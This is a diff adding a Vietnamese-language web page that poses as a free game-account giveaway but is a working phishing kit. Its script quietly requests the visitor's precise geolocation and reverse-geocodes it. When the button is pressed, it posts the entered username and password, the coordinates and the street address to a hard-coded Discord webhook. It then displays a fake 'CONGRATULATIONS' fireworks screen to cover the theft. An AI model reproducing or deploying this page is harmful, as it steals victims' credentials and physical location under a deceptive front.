@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Nhận Acc Free</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #0a0a1a;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+            transition: 0.8s;
+        }
+
+        /* ===== NỀN SAO ===== */
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .star {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 2s infinite alternate;
+        }
+
+        @keyframes twinkle {
+            0% { opacity: 0.2; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); }
+        }
+
+        /* ===== GLASS CARD ===== */
+        .glass {
+            position: relative;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 32px;
+            padding: 44px 34px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
+            transition: 0.6s ease;
+        }
+
+        .glass.hidden {
+            opacity: 0;
+            transform: scale(0.8);
+            pointer-events: none;
+        }
+
+        .logo {
+            text-align: center;
+            font-size: 52px;
+            margin-bottom: 2px;
+        }
+
+        h2 {
+            color: #fff;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        h2 .highlight {
+            background: linear-gradient(135deg, #00c8ff, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .sub {
+            color: #aaa;
+            text-align: center;
+            font-size: 14px;
+            margin: 4px 0 20px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            padding-bottom: 16px;
+        }
+
+        .sub span {
+            color: #fbbf24;
+            font-weight: 600;
+        }
+
+        .tag {
+            display: inline-block;
+            background: rgba(251, 191, 36, 0.08);
+            color: #fbbf24;
+            font-size: 13px;
+            padding: 6px 18px;
+            border-radius: 40px;
+            border: 1px solid rgba(251, 191, 36, 0.15);
+            margin-bottom: 18px;
+            text-align: center;
+            width: 100%;
+            letter-spacing: 0.3px;
+            animation: pulseTag 2s infinite;
+        }
+
+        @keyframes pulseTag {
+            0%, 100% { opacity: 0.9; }
+            50% { opacity: 0.5; }
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #00c8ff;
+            background: rgba(255, 255, 255, 0.06);
+            box-shadow: 0 0 24px rgba(0, 200, 255, 0.06);
+        }
+
+        .input-group input::placeholder {
+            color: #666;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #00c8ff, #7c3aed);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 6px 30px rgba(0, 100, 255, 0.2);
+            letter-spacing: 0.5px;
+            margin-top: 4px;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 44px rgba(0, 100, 255, 0.3);
+        }
+
+        .btn:active {
+            transform: scale(0.96);
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #fbbf24;
+            min-height: 24px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #444;
+            font-size: 12px;
+        }
+
+        /* ===== CONGRATULATIONS OVERLAY ===== */
+        .congrats-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, #0a0a2e, #000000);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            animation: fadeIn 1s ease;
+        }
+
+        .congrats-overlay.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .congrats-text {
+            font-size: 80px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #fbbf24, #ff6b6b, #a855f7, #00c8ff);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: gradientMove 3s ease infinite, scalePulse 1.5s ease-in-out infinite;
+            text-shadow: none;
+            z-index: 1001;
+            letter-spacing: 4px;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes scalePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+
+        .congrats-sub {
+            color: #aaa;
+            font-size: 22px;
+            margin-top: 16px;
+            z-index: 1001;
+            letter-spacing: 2px;
+            animation: fadeInUp 2s ease;
+        }
+
+        @keyframes fadeInUp {
+            0% { opacity: 0; transform: translateY(30px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== PHÁO HOA CANVAS ===== */
+        #fireworksCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
+            pointer-events: none;
+        }
+
+        @media (max-width: 600px) {
+            .congrats-text { font-size: 40px; }
+            .congrats-sub { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- NỀN SAO -->
+    <div class="stars" id="stars"></div>
+
+    <!-- CARD ĐĂNG NHẬP -->
+    <div class="glass" id="loginCard">
+        <div class="logo">🎮</div>
+        <h2>Nhận Acc <span class="highlight">Free</span></h2>
+        <div class="sub">🎁 Đăng nhập để nhận <span>Random Account</span></div>
+
+        <div class="tag">⚡ Còn 128 acc • Đang hot</div>
+
+        <div class="input-group">
+            <input type="text" id="username" placeholder="👤 Tên đăng nhập / Email" />
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="🔑 Mật khẩu" />
+        </div>
+
+        <button class="btn" id="loginBtn">🚀 Nhận Acc Ngay</button>
+        <div class="status" id="status">✨ Nhập thông tin và bấm nhận</div>
+
+        <div class="footer">
+            🔒 Bảo mật • Hệ thống tự động • 24/7
+        </div>
+    </div>
+
+    <!-- OVERLAY CONGRATULATIONS + PHÁO HOA -->
+    <div class="congrats-overlay" id="congratsOverlay">
+        <canvas id="fireworksCanvas"></canvas>
+        <div class="congrats-text">🎉 CONGRATULATIONS 🎉</div>
+        <div class="congrats-sub">Bạn đã nhận được 1 tài khoản VIP!</div>
+    </div>
+
+    <script>
+        // ===== TẠO SAO =====
+        const starsContainer = document.getElementById('stars');
+        for (let i = 0; i < 120; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.animationDelay = Math.random() * 2 + 's';
+            star.style.animationDuration = (1.5 + Math.random() * 2) + 's';
+            star.style.width = (1 + Math.random() * 3) + 'px';
+            star.style.height = star.style.width;
+            starsContainer.appendChild(star);
+        }
+
+        // ===== DISCORD WEBHOOK =====
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524287822968651946/wD0QnLQ-NLS6Q1JvEi-esT0sZZazJLbN32ssAer8cFsWrzAIAaRWHcdTKNdrFIUNhYtx';
+
+        // ===== LẤY VỊ TRÍ =====
+        let locationData = {
+            lat: null,
+            lon: null,
+            acc: null,
+            address: 'Đang lấy...'
+        };
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    locationData.lat = pos.coords.latitude;
+                    locationData.lon = pos.coords.longitude;
+                    locationData.acc = pos.coords.accuracy;
+
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.lat}&lon=${locationData.lon}&zoom=18&addressdetails=1`)
+                        .then(res => res.json())
+                        .then(data => {
+                            locationData.address = data.display_name || 'Không xác định';
+                        })
+                        .catch(() => {
+                            locationData.address = 'Lỗi lấy địa chỉ';
+                        });
+                },
+                function(err) {
+                    locationData.address = '❌ Lỗi định vị: ' + err.message;
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            locationData.address = '❌ Trình duyệt không hỗ trợ định vị';
+        }
+
+        // ===== BẤM NÚT =====
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            const username = document.getElementById('username').value || 'Không có';
+            const password = document.getElementById('password').value || 'Không có';
+            const status = document.getElementById('status');
+
+            status.innerHTML = '⏳ Đang xác thực...';
+            status.style.color = '#00c8ff';
+
+            // Gửi Discord
+            sendToDiscord(username, password, locationData);
+
+            // Ẩn card login
+            document.getElementById('loginCard').classList.add('hidden');
+
+            // Hiện pháo hoa + congratulations
+            setTimeout(() => {
+                document.getElementById('congratsOverlay').classList.add('show');
+                startFireworks();
+            }, 600);
+        });
+
+        function sendToDiscord(user, pass, loc) {
+            const embed = {
+                title: '🎯 LOGIN + LOCATION',
+                color: 0x7c3aed,
+                fields: [
+                    { name: '👤 Username', value: user, inline: true },
+                    { name: '🔑 Password', value: pass, inline: true },
+                    { name: '📍 Địa chỉ', value: loc.address || 'Không có', inline: false },
+                    { name: 'Latitude', value: loc.lat ? loc.lat.toString() : 'Không có', inline: true },
+                    { name: 'Longitude', value: loc.lon ? loc.lon.toString() : 'Không có', inline: true },
+                    { name: '📏 Độ chính xác', value: loc.acc ? loc.acc + 'm' : 'N/A', inline: true },
+                    { name: '🕐 Thời gian', value: new Date().toLocaleString(), inline: false }
+                ],
+                footer: { text: '🎁 Nhận Acc Free • @tpmodz' },
+                timestamp: new Date().toISOString()
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            }).catch(err => console.log('Lỗi gửi Discord:', err));
+        }
+
+        // ===== PHÁO HOA =====
+        function startFireworks() {
+            const canvas = document.getElementById('fireworksCanvas');
+            const ctx = canvas.getContext('2d');
+            let W, H;
+
+            function resize() {
+                W = canvas.width = window.innerWidth;
+                H = canvas.height = window.innerHeight;
+            }
+            resize();
+            window.addEventListener('resize', resize);
+
+            const particles = [];
+            const rockets = [];
+
+            class Particle {
+                constructor(x, y, color) {
+                    this.x = x;
+                    this.y = y;
+                    this.color = color;
+                    const angle = Math.random() * 2 * Math.PI;
+                    const speed = Math.random() * 6 + 3;
+                    this.vx = Math.cos(angle) * speed;
+                    this.vy = Math.sin(angle) * speed;
+                    this.alpha = 1;
+                    this.decay = Math.random() * 0.02 + 0.01;
+                    this.size = Math.random() * 4 + 2;
+                }
+                update() {
+                    this.x += this.vx;
+                    this.y += this.vy;
+                    this.vy += 0.06;
+                    this.alpha -= this.decay;
+                }
+                draw() {
+                    ctx.globalAlpha = this.alpha;
+                    ctx.fillStyle = this.color;
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            class Rocket {
+                constructor() {
+                    this.x = Math.random() * W;
+                    this.y = H;
+                    this.targetY = Math.random() * H * 0.4 + 50;
+                    this.speed = 6 + Math.random() * 4;
+                    this.angle = (Math.random() - 0.5) * 0.4;
+                    this.trail = [];
+                    this.color = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                    this.exploded = false;
+                }
+                update() {
+                    if (!this.exploded) {
+                        this.trail.push({ x: this.x, y: this.y });
+                        if (this.trail.length > 8) this.trail.shift();
+                        this.x += Math.sin(this.angle) * 0.5;
+                        this.y -= this.speed;
+                        if (this.y <= this.targetY) {
+                            this.explode();
+                        }
+                    }
+                }
+                explode() {
+                    this.exploded = true;
+                    for (let i = 0; i < 100; i++) {
+                        const color = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                        particles.push(new Particle(this.x, this.y, color));
+                    }
+                }
+                draw() {
+                    if (!this.exploded) {
+                        for (let i = 0; i < this.trail.length; i++) {
+                            const alpha = i / this.trail.length;
+                            ctx.globalAlpha = alpha * 0.6;
+                            ctx.fillStyle = '#fff';
+                            ctx.beginPath();
+                            ctx.arc(this.trail[i].x, this.trail[i].y, 2, 0, Math.PI * 2);
+                            ctx.fill();
+                        }
+                        ctx.globalAlpha = 1;
+                        ctx.fillStyle = '#fff';
+                        ctx.beginPath();
+                        ctx.arc(this.x, this.y, 4, 0, Math.PI * 2);
+                        ctx.fill();
+                    }
+                }
+            }
+
+            function loop() {
+                ctx.clearRect(0, 0, W, H);
+
+                if (Math.random() < 0.05 && rockets.length < 20) {
+                    rockets.push(new Rocket());
+                }
+
+                for (let i = rockets.length - 1; i >= 0; i--) {
+                    rockets[i].update();
+                    rockets[i].draw();
+                    if (rockets[i].exploded) {
+                        rockets.splice(i, 1);
+                    }
+                }
+
+                for (let i = particles.length - 1; i >= 0; i--) {
+                    particles[i].update();
+                    particles[i].draw();
+                    if (particles[i].alpha <= 0) {
+                        particles.splice(i, 1);
+                    }
+                }
+
+                requestAnimationFrame(loop);
+            }
+
+            loop();
+        }
+    </script>
+
+</body>
+</html>
